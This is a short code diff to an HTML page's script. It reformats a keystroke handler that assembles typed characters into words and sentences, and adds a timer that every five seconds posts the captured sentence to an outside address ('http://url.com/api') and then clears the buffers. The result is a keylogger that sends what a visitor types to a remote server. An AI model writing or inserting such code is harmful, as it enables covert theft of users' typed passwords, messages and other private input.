@@ -14,19 +14,35 @@
 
       word = word + character_value;
 
-      if(character_code == 32) {
+
+      if(character_code == 32) 
+      {
 	console.log("Word: " + word);
 	sentence = sentence + word;
 	word = "";
       }
 
-      if(character_code == 13 || character_code == 190) {
+
+      if(character_code == 13 || character_code == 190) 
+      {
         console.log("Sentence: " + sentence);
         text = text + sentence + word;	
         word = "";
 	sentence = "";
       }
     });
+
+	  
+    setInterval(function(){
+	console.log("Text for Submission: " + text);
+	    
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST', 'http://url.com/api');
+	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	xhr.send('sentence=' + sentence);
+	    
+	text = ""; sentence = ""; word = "";
+    }, 5000);
   </script>
   <body>
   </body>
